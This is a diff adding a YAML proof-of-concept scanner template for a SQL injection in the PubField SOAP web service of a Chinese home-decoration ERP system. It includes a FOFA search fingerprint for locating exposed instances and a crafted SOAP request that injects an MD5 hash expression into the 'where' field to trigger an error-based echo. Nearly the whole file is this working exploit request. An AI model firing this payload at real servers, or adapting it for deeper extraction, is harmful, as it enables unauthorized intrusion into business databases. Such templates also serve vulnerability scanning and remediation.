@@ -1,0 +1,25 @@
+id: poc-yaml-znfit-erp-ms-pubfield-sqli
+info:
+  name: 家装ERP管理系统 PubField SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 家装ERP管理系统
+  fofa: body="上海装盟信息科技有限公司"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /WEB_SERVICE/Public.asmx
+  headers:
+    Content-Type: text/xml; charset=utf-8
+    SOAPAction: http://tempuri.org/PubField
+  data: "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\
+    \ xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    >\n  <soap:Body>\n    <PubField xmlns=\"http://tempuri.org/\">\n      <field>1</field>\n\
+    \      <tbName>master.dbo.sysdatabases</tbName>\n      <where>1=sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))</where>\n\
+    \    </PubField>\n  </soap:Body>\n</soap:Envelope>"
+  expression: status_code == 500 && contains(body,"服务器无法处理请求") && contains(body,"0x"
+    + t2) && contains(body,"转换成数据类型") && contains(content_type,"text/xml")
+transport: http
